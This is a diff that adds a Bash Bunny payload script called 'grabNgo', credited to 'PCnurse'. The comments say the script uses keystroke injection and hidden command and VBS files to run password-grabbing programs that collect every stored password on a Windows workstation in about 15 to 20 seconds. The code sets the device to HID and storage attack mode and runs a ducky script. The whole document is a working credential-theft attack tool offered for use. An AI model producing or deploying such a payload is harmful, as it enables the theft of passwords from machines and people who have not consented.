@@ -1,0 +1,33 @@
+#!/bin/bash
+#
+# Title:         grabNgo
+# Author:        PCnurse
+# Version:       1.0
+# Target:        Windows 7+
+# 
+# Executes d.cmd from the selected switch folder of the Bash Bunny USB Disk partition,
+# which in turn executes e.cmd invisibly using i.vbs
+# which in turn runs MrGraysRubberHack EXEs to grab any password on the work station
+# BashBunny loads in about 8 seconds, 5 Seconds to stage Bunny and script runs in about 2 seconds.
+# Total time to run about 15 - 20 seconds. Once you see the green light Grab and Go!
+
+#Staging Bunny' Sold Amber Light
+LED R G 
+ATTACKMODE HID STORAGE
+# Set your language here
+LANGUAGE='us'
+# Check for switch position
+source bunny_helpers.sh
+
+#Runs Quack script, Flashing Blue. If Sold Red light check your ducky script location
+if [ -f "/root/udisk/payloads/${SWITCH_POSITION}/ducky_script.txt" ]; then
+		LED b 200
+        QUACK ${SWITCH_POSITION}/ducky_script.txt
+       
+else
+    LED R
+    echo "Unable to load ducky_script.txt" >> /root/debuglog.txt
+        exit 1
+fi
+#Finished Grab N Go, Hop like a Bunny out of there. Green Light!!
+LED G
